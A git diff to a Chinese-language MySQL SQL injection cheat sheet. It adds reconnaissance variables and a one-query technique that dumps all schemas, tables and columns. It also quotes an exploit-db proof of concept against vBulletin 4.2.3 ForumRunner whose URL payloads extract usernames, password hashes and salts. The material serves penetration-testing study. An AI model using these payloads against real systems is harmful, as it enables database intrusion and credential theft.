@@ -26,7 +26,7 @@ Command Execution    If mysqld (<5.0) is running as root AND you compromise a DB
 
 ```
 
-## 0x01 信息收集
+## 信息收集
 
 ```
 system_user()     系统用户名
@@ -41,6 +41,8 @@ load_file()       MYSQL读取本地文件
 
 @@datadir         Location of DB files
 @@hostname        服务器主机名
+@@basedir         MYSQL 安装路径
+@@version_compile_os    操作系统
 ```
 
 ```
@@ -50,7 +52,7 @@ List Password Hashes    SELECT host, user, password FROM mysql.user; — priv
 SELECT distinct(db) FROM mysql.db — priv
 ```
 
-## 0x02 information_schema
+## information_schema
 
 > MySQL >= v5.0
 
@@ -76,18 +78,106 @@ SELECT table_schema, table_name FROM information_schema.columns WHERE column_nam
 SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges;
 ```
 
-
-## 0x03 注释
+### 不一样的查询
 
 ```
- -- comment     # '--' 前后有空格
+SELECT @ FROM (SELECT @:=0,(SELECT @ FROM YOUR_TABLE_NAME WHERE @ IN (@:=CONCAT(@, 0x0a,concat_ws(0x3a,YOUR_COLUMN_NAME, YOUR_COLUMN_NAME)))))x; 
+
+SELECT @ FROM (SELECT @:=0,(SELECT 0 FROM YOUR_TABLE_NAME WHERE 0x00 IN (@:=CONCAT(@, 0x0a,concat_ws(0x3a,YOUR_COLUMN_NAME, YOUR_COLUMN_NAME)))))x; 
+```
+
+语句中`@`可以为`@x`等`@`+`其他字母`的组合，仅是定义变量，`@`是必须的。
+
+* 列出每个数据库的所有表
+
+
+```
+SELECT @ FROM (SELECT @:=0,(SELECT @ FROM information_schema.columns WHERE @ IN (@:=CONCAT(@, 0x0a,concat_ws(0x3a,table_schema, table_name)))))x; 
+```
+
+返回结果如下
+
+```
+...
+information_schema:INNODB_BUFFER_PAGE
+information_schema:INNODB_CMP_PER_INDEX_RESET
+information_schema:XTRADB_READ_VIEW
+information_schema:INNODB_SYS_SEMAPHORE_WAITS
+information_schema:INNODB_CHANGED_PAGES
+information_schema:INNODB_FT_DELETED
+information_schema:INNODB_TABLESPACES_SCRUBBING
+mysql:column_stats
+mysql:columns_priv
+mysql:db
+mysql:event
+mysql:func
+mysql:general_log
+mysql:gtid_slave_pos
+mysql:help_category
+mysql:help_keyword
+mysql:help_relation
+mysql:help_topic
+mysql:host
+mysql:index_stats
+...
+```
+
+* 列出给个数据库的所有表的所有字段
+
+```
+SELECT @ FROM (SELECT @:=0,(SELECT @ FROM information_schema.columns WHERE @ IN (@:=CONCAT(@, 0x0a,concat_ws(0x3a,table_schema, table_name, column_name)))))x; 
+```
+
+结果如下：
+
+```
+information_schema:INNODB_TABLESPACES_SCRUBBING:CURRENT_SCRUB_STARTED
+information_schema:INNODB_TABLESPACES_SCRUBBING:CURRENT_SCRUB_ACTIVE_THREADS
+information_schema:INNODB_TABLESPACES_SCRUBBING:CURRENT_SCRUB_PAGE_NUMBER
+information_schema:INNODB_TABLESPACES_SCRUBBING:CURRENT_SCRUB_MAX_PAGE_NUMBER
+mysql:column_stats:db_name
+mysql:column_stats:table_name
+mysql:column_stats:column_name
+mysql:column_stats:min_value
+mysql:column_stats:max_value
+mysql:column_stats:nulls_ratio
+```
+
+* 实例 
+
+[vBulletin 4.2.3 - 'ForumRunner' SQL Injection](https://www.exploit-db.com/exploits/40751/)
+
+```
+////////////////
+///  POC   ////
+///////////////
  
-#comment
-
-/*comment*/
+SQL Injection payload to enumerate table names
+----------------------------------------------
+http://forum_directory/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (@x) from (select (@x:=0x00),(select (0) from (information_schema.tables)where (table_schema=database()) and (0x00) in (@x:=concat(@x,0x3c62723e,table_name))))x),5,6,7,8,9,10-- -
+ 
+ 
+SQL Injection payload to enumerate column names from table "user"
+----------------------------------------------------------------
+http://forum_directory/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (@x) from (select (@x:=0x00),(select (0) from (information_schema.columns)where (table_name=0x75736572) and (0x00) in (@x:=concat(@x,0x3c62723e,column_name))))x),5,6,7,8,9,10-- -
+ 
+ 
+SQL Injection payload to enumerate username,password hash and salt from "user" table
+----------------------------------------------------------------------------------
+http://forum_directory//forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (@x) from (select (@x:=0x00),(select (0) from (user)where (0x00) in (@x:=concat(@x,0x3c62723e,username,0x3a,password,0x3a,salt))))x),5,6,7,8,9,10-- -
 ```
 
-## 0x04 文件权限
+## 注释
+
+```
+ 1.-- comment     # '--' 后有 空格, 常用 "-- -", "--+"
+ 
+2.#comment
+
+3./*comment
+```
+
+## 文件权限
 
 查询用户读写文件操作权限：
 
@@ -99,7 +189,7 @@ SELECT file_priv FROM mysql.user WHERE user = 'username';
 SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%username%'; 	
 ```
 
-## 0x05 load_file()
+## load_file()
 
 用户有文件操作权限则可以读取文件
 
@@ -121,7 +211,7 @@ MySQL用户必须拥有对此文件读取的权限。
 文件不存在或不可读，返回NULL
 ```
 
-## 0x06 写文件
+## 写文件
 
 如果用户有文件操作权限可以写文件
 
@@ -145,7 +235,7 @@ INTO OUTFILE 必须是最后一个查询。
 引号是必须的，因为没有办法可以编码路径名
 ```
  
-## 0x 实战
+## 实战
 
 ### group by with rollup
 
